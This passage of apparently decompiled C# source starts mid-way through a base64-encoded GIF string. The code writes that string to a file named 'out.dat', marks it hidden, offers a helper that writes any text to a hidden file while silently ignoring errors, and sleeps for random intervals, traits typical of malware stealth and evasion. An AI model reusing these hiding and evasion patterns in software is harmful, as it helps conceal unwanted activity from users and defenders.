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";
      try
      {
        // If the file exists already then delete it
        if (System.IO.File.Exists("out.dat"))
        {
          System.IO.File.SetAttributes("out.dat", FileAttributes.Normal);
          System.IO.File.Delete("out.dat");
        }
        // Write the gif string to the file then set it to hidden
        TextWriter textWriter = (TextWriter) new StreamWriter("out.dat");
        textWriter.WriteLine(base64_enc_gif);
        textWriter.Flush();
        textWriter.Close();
        System.IO.File.SetAttributes("out.dat", FileAttributes.Hidden);
      }
      catch (IOException ex)
      {
      }
    }

    // Writes string to a file and sets it to hidden
    public void write_string_to_file(string filename, string text_to_write)
    {
      try
      {
        if (System.IO.File.Exists(filename))
        {
          System.IO.File.SetAttributes(filename, FileAttributes.Normal);
          System.IO.File.Delete(filename);
        }
        TextWriter textWriter = (TextWriter) new StreamWriter(filename);
        textWriter.WriteLine(text_to_write);
        textWriter.Flush();
        textWriter.Close();
        System.IO.File.SetAttributes(filename, FileAttributes.Hidden);
      }
      catch (IOException ex)
      {
      }
    }


    public void sleep_for_random_time(int lower_bound, int upper_bound)
    {
      Thread.Sleep(new Random().Next(lower_bound, upper_bound) * 1000);
    }
  }
}
